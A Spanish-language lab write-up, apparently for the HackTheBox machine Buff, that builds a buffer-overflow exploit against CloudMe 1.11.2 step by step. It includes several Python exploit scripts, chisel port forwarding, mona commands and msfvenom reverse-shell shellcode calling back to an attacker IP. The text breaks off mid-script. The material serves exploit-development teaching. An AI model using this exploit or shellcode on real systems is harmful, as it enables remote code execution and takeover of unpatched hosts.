## BufferOverflow {-}

Aqui vamos a trabajar principalmente en la maquina windows. Analizando el exploit del BufferOverflow que nos da
searchsploit vemos que podemos descargarnos el binario `CloudMe_1112.exe` en el link `https://www.cloudme.com/downloads/CloudMe_1112.exe`.
Lo descargamos en la maquina Windows y lo installamos. La installacion es la typica de windows (next, next, next...).

Nos tenemos que crear un usuario y iniciar una session.

Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando `netstat -nat`. Aqui vemos
que el puerto 8888 esta corriendo.

En esta situacion hay que entender que nosotros vamos a utilizar nuestra propria maquina windows como maquina de test. todo los passos siguientes
estaran echo en esta maquina y tendremos que hacerlo de nuevo en la maquina Buff. 

### Exponer el puerto 8888 hacia fuera {-}

Como este servicio es interno, el puerto 8888 no esta visible desde el exterior. Aqui utilizaremos **Chisel.exe** para hacer un port forwarding.
Descargamos manualmente **Chisel y 7zip**. 

1. En la maquina de attackante

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ./chisel server --reverse --port 1234
    ```

1. En la maquina Windows

    ```bash
    ./chisel.exe client 192.168.0.16:1234 R:8888:127.0.0.1:8888
    ```


### Script en pyton para ejecutar el BufferOverflow {-}

En la maquina de atacante, nos creamos un script en python que nos permitte ejecutar el BufferOverflow. Este Script ira evolucionando
durante las etapas.

#### Etapa 1 : Denial Of Service {-}

El BufferOverflow viene de un error de sanitizacion durante el envio de una data que se espera a recivir un tamanio definido de data y sobre el
cual si un atcante decide enviarle mas data de lo previsto, hace petar el servicio. En el siguiente script vamos a enviar al servicio unas 5000 **A**
de data para ver si el servicio cae.

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    payload = b"A" * 5000

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Ejecutando el script vemos que el CloudMe para de functionnar el la maquina Windows. 

```{r, echo = FALSE, fig.cap="BufferOverflow DOS", out.width="90%"}
    knitr::include_graphics("images/Buff-DOS.png")
```


#### Etapa 2 : Analizando lo que pasa con Immunity Debugger {-}

En la maquina windows, arrancamos otra vez el servicio CloudMe y nos abrimos el Immunity Debugger.

Pinchamos en el menu File del Immunity Debugger a attach y seleccionamos el servicio CloudMe

```{r, echo = FALSE, fig.cap="BufferOverflow Attach service", out.width="90%"}
    knitr::include_graphics("images/Buff-ID_attach.png")
```

Cuando lo lanzamos siempre nos va a poner el servicio en *PAUSED* y tenemos que darle al boton *PLAY*.

Desde la maquina victima lanzamos otra vez el exploit para ver lo que pasa.

```bash
python3 exploit.py
```

En el Immunity debugger podemos ver que se a vuelto a PAUSEAR y en la ventanita Registers (FPU) que hay cossas turbias.

##### Explicacion del stack {-}


```{r, echo = FALSE, fig.cap="BufferOverflow explicacion stack", out.width="90%"}
    knitr::include_graphics("images/Buff-stack_explanation.png")
```

En el graphico vemos las **A** que es lo que suele passar cuando le enviamos data al programma, en este casso **A**. Si el buffer
definido no esta sanitizado correctamente y que le enviamos mas **A** de lo previsto, las **A** van subiendo hasta que sobre escriba
registros como el **EBP** y el **RET tambien llamado EIP**. Lo podemos ver en el Immunity Debugger aqui.

```{r, echo = FALSE, fig.cap="BufferOverflow overflow with A", out.width="90%"}
    knitr::include_graphics("images/Buff-As.png")
```

Aqui se puede ver un monton de "41414141" que 41 es el valor Hexadecimal ASCII de la lettra A. 

Lo critico aqui es cuando el atacante toma el control del **EIP (RET)** porque el **EIP** define donde appunta la siguiente instruccion a 
ejecutar. En el caso de las **A**, el programma cuando llega al EIP piensa que la siguiente instruccion que hay que ejecutar se encuentra en
la Memory Address 0x41414141 (porque la hemos sobre escrito), y claro como esta direccion no existe hace que el programma pete.

#### Etapa 3: Sobre escribir el EIP {-}

Como atacante, ahora tenemos que saver cuantas **A** tenemos que meter para sobre escribir el **EIP** con el valor que nosotros queremos meter.
La technica para que sea visual seria ponerl 0x42424242 al EIP que serian cuatro vecez la lettra **B**.

Hay una utlidad que nos permitte crear un pattern de caracteres aleatorios para encontrar mas facilmente donde se encuentra el EIP o mejor dicho cuantas **A**
tengo que poner antes de ponerle las **B**.

En la maquina de atacante

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
```

esto lo podemos copiar y ponerlo en nuestro exploit.

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7A
    e8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak
    0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2
    Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4A
    u5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az
    7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9
    Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1B
    k2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp
    4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6
    Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8B
    z9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf
    1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3
    Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5C
    p6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu
    8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0
    Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D
    f3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk
    5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7
    Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9D
    v0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea
    2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4
    Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6E
    k7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep
    9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1
    Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3F
    a4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff
    6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8
    Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0F
    q1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv
    3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5
    Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7G
    f8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Una vez mas tenemos que lanzar el CloudMe porque previamente a petado. Tambien tenemos nuevamente que attachear al Immunity Debugger el servicio CloudMe.
Lanzamos el script y vemos que el valor del EIP vale `316A4230`

Con la herramienta `pattern_offset` podemos comprovar cuantas **A** tengo que meter antes de sobre escribir la EIP

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230

#Output
[*] Exact match at offset 1052
```

Ahora que tenemos el offset, vamos a modificar el script.

#### Etapa 4: Encontrar la direccion donde despues del EIP {-}

Aqui despues de añadir las **A** que tiene que tener 1052 de offset y las 4 **B** que seria el EIP, vamos a añadir
500 **C** para buscar la direccion donde se sobre escribe el resto del programa. 

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time

from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    offset = 1052
    before_eip = b"A" * offset
    eip = b"B" * 4
    after_eip = b"C" * 500

    payload = before_eip + eip + after_eip

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

Si lanzamos el script, vemos en el Immunity debugger que el EIP vale ahora 42424242, es el punto donde savemos que tenemos el control
del EIP. Ahora la pregunta es, que tiene que valer el EIP para poderle injectar los commandos que queremos. Pues en el Immunity debugger, 
que el **ESP** contiene un monton de **C**. el ESP es la Stack. Si le hacemos un click derecho a la direccion y les damos a **Follow in Dumb**, 
en la parte baja de la izquierda vemos todas la **C** en formato raw.

Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP** `0x0022D470` que es la pilla. El problema es que no podemos simplemente ponerle al
EIP la direccion del ESP porque esto no va a funccionar. Tendremos aqui que usar un concepto que se llama **OPCODE**. El **OPCODE** son instrucciones
a bajo nivel que nos permitte hacer un Jump al ESP llamado **JMPESP**.

Pero antes de mirrar el **OPCODE**, vamos a preparar el script malicioso que queremos ejecutar.

#### Etapa 5: Preparacion del codigo malicioso {-}

Como atacante, no queremos que el programa nos interprete una serie de **C** pero un codigo malicioso en caracteres Hexadecimal. 
El problema que puede surgir, es que algunos caracteres no se logren interpretar por el programa. Estos carateres son llamados **BadChars**.
Tenemos que empezar por buscar estos **BadChars**.

1. Configurar el entorno de trabajo con mona

    A bajo de la ventana del Immunity Debugger, podemos entrar commandos. Aqui creamos un directorio para poder trabajar correctamente

    - `!mona config -set workingfolder C:\Users\S4vitar\Desktop\%p`

    ```{r, echo = FALSE, fig.cap="Mona Set working directory", out.width="90%"}
        knitr::include_graphics("images/Buff-mona_set_wdir.png")
    ```

1. Utilizamos mona para crear una lista de todos los caracteres en Hexadecimal

    ```bash
    !mona bytearray -cpb "\x00"
    ```

    Aqui mona nos crea un fichero llamado bytearray` en el escritorio que contiene todos los valores en Hex del 01 al FF. Por prevencion
    quittamos de entrada el caracter `x00` que es un **BadChars** bastante commun.

1. Enviamos todos estos caracteres en la pila para ver en que punto, o mejor dicho que carateres hacen quel programa pete.

    ```python
    #!/usr/bin/python3

    import socket
    import signal
    import pdb
    import sys
    import time

    from pwn import *
    from struct import pack

    # Variables globales
    remoteAddress = "127.0.0.1"

    def executeExploit():
        badChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0 \xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
        offset = 1052
        before_eip = b"A" * offset
        eip = b"B" * 4

        payload = before_eip + eip + badChars

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((remoteAddress, 8888))
        s.send(payload)

    if __name__ == "__main__":
        executeExploit()
    ```

1. En el Immunity debugger con mona miramos que caracteres no an sido interpretado

    ```{r, echo = FALSE, fig.cap="Buf Bad chars", out.width="90%"}
        knitr::include_graphics("images/Buff-BadChars.png")
    ```

    ```bash
    !mona compare -f C:\Users\S4vitar\Desktop\CloudMe\bytearray.txt -a 0022D470
    ```

En el caso que nos reporte **BadChars** tendriamos que quitarlos de la lista y volver a effectuar lo mismo hasta que no
tengamos mas **BadChars**. Y desde aqui nos podemos crear el script malicioso con la lista de caracteres que tenemos. En 
este caso no hay **BadChars** pero le quitaremos siempre el `\x00` por precaucion.

#### Etapa 6: Creacion del shell code malicioso {-}

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.16 LPORT=443 -a x86 --platform windows -b "\x00" -e x86/shikata_ga_nai -f c
```

```{r, echo = FALSE, fig.cap="Buf Shell code", out.width="90%"}
    knitr::include_graphics("images/Buff-Shell-code.png")
```

```python
#!/usr/bin/python3

import socket
import signal
import pdb
import sys
import time
from pwn import *
from struct import pack

# Variables globales
remoteAddress = "127.0.0.1"

def executeExploit():
    shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
        b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
        b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
        b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
        b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
        b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
        b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
        b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
        b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
        b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
        b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
        b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
        b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
        b"\xc3\xdc\x15\x60\x93\x72\xc6\xc1\x43\x33\xb6\xa9\x89\xbc\xe9"
        b"\xca\xb2\x16\x82\x61\x49\xf1\x6d\xdd\x51\x11\x06\x1c\x51\x10"
        b"\x6d\xa9\xb7\x78\x81\xfc\x60\x15\x38\xa5\xfa\x84\xc5\x73\x87"
        b"\x87\x4e\x70\x78\x49\xa7\xfd\x6a\x3e\x47\x48\xd0\xe9\x58\x66"
        b"\x7c\x75\xca\xed\x7c\xf0\xf7\xb9\x2b\x55\xc9\xb3\xb9\x4b\x70"
        b"\x6a\xdf\x91\xe4\x55\x5b\x4e\xd5\x58\x62\x03\x61\x7f\x74\xdd"
        b"\x6a\x3b\x20\xb1\x3c\x95\x9e\x77\x97\x57\x48\x2e\x44\x3e\x1c"
        b"\xb7\xa6\x81\x5a\xb8\xe2\x77\x82\x09\x5b\xce\xbd\xa6\x0b\xc6"
        b"\xc6\xda\xab\x29\x1d\x5f\xdb\x63\x3f\xf6\x74\x2a\xaa\x4a\x19"
        b"\xcd\x01\x88\x24\x4e\xa3\x71\xd3\x4e\xc6\x74\x9f\xc8\x3b\x05"
        b"\xb0\xbc\x3b\xba\xb1\x94")
    offset = 1052
    before_eip = b"A" * offset
    eip = b"B" * 4

    payload = before_eip + eip + shellcode

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteAddress, 8888))
    s.send(payload)

if __name__ == "__main__":
    executeExploit()
```

#### Etapa 6: Asignar el opcode al EIP {-}

```{r, echo = FALSE, fig.cap="Buf opcode", out.width="90%"}
    knitr::include_graphics("images/Buff-jmpesp.png")
```

Como dicho precedamente, no podemos meter la direccion del **ESP** directamente en el **EIP** para ejecutar el Shell code.
Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el commando **JMPESP** para redirigirnos al Shell code.

1. Busqueda de modulos con mona

    ```bash
    !mona modules
    ```

1. Buscamos una dll que tenga todas las protecciones a False

    ```{r, echo = FALSE, fig.cap="Buf no protected modules", out.width="90%"}
    knitr::include_graphics("images/Buff-protection_false.png")
    ```

1. En internet buscamos el opcode [defuse.ca](https://defuse.ca/online-x86-assembler.htm)

    ```{r, echo = FALSE, fig.cap="Buf no protected modules", out.width="90%"}
    knitr::include_graphics("images/Buff-protection_false.png")
    ```

1. Buscar el opcode (en este caso `ff e4`) en la dll.

    ```bash
    !mona find -s "\xff\xe4" -m Qt5Core.dll
    ```

1. Seleccionar una direccion que tenga derechos de ejecucion

    ```{r, echo = FALSE, fig.cap="Buf exec right jmpesp", out.width="90%"}
    knitr::include_graphics("images/Buff-execution-rights-jmpesp.png")
    ```

1. Cambiamos el script poniendole la nueva direccion

    ```python
    #!/usr/bin/python3

    import socket
    import signal
    import pdb
    import sys
    import time
    from pwn import *
    from struct import pack

    # Variables globales
    remoteAddress = "127.0.0.1"

    def executeExploit():
        shellcode = (b"\xba\xf8\x9f\xaf\x72\xda\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
            b"\x52\x31\x55\x12\x83\xc5\x04\x03\xad\x91\x4d\x87\xb1\x46\x13"
            b"\x68\x49\x97\x74\xe0\xac\xa6\xb4\x96\xa5\x99\x04\xdc\xeb\x15"
            b"\xee\xb0\x1f\xad\x82\x1c\x10\x06\x28\x7b\x1f\x97\x01\xbf\x3e"
            b"\x1b\x58\xec\xe0\x22\x93\xe1\xe1\x63\xce\x08\xb3\x3c\x84\xbf"
            b"\x23\x48\xd0\x03\xc8\x02\xf4\x03\x2d\xd2\xf7\x22\xe0\x68\xae"
            b"\xe4\x03\xbc\xda\xac\x1b\xa1\xe7\x67\x90\x11\x93\x79\x70\x68"
            b"\x5c\xd5\xbd\x44\xaf\x27\xfa\x63\x50\x52\xf2\x97\xed\x65\xc1"
            b"\xea\x29\xe3\xd1\x4d\xb9\x53\x3d\x6f\x6e\x05\xb6\x63\xdb\x41"
            b"\x90\x67\xda\x86\xab\x9c\x57\x29\x7b\x15\x23\x0e\x5f\x7d\xf7"
            b"\x2f\xc6\xdb\x56\x4f\x18\x84\x07\xf5\x53\x29\x53\x84\x3e\x26"
            b"\x90\xa5\xc0\xb6\xbe\xbe\xb3\x84\x61\x15\x5b\xa5\xea\xb3\x9c"
            b"\xca\xc0\x04\x32\x35\xeb\x74\x1b\xf2\xbf\x24\x33\xd3\xbf\xae"
